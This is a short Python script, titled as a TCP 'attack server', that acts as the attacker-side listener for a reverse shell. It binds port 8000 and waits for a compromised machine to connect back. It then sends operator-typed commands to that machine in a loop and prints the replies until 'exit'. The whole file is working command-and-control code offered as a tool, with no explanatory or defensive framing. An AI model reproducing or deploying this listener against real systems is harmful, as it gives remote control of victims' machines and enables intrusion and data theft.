# TCP Listening/attack Server

#!/bin/python
from socket import *

serverPort = 8000 # setting port to listen on
serverSocket = socket(AF_INET, SOCK_STREAM)  # setting Socket as TCP
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
serverSocket.bind(('', serverPort)) # binding to open socket
serverSocket.listen(1)
print("Attacker box listening and awaiting instructions")
connectionSocket, addr = serverSocket.accept() # Accepting and connecting to socket
print("Thanks for connecting to me" +str(addr)) # Connection Acknowledgement

message = connectionSocket.recv(1024)
print(message)

command = " "

while command != "exit":
    command = input("Please enter a command: ")
    connectionSocket.send(command.encode())
    message = connectionSocket.recv(1024).decode()
    print(message)

connectionSocket.shutdown(SHUT_RDWR)
connectionSocket.close()



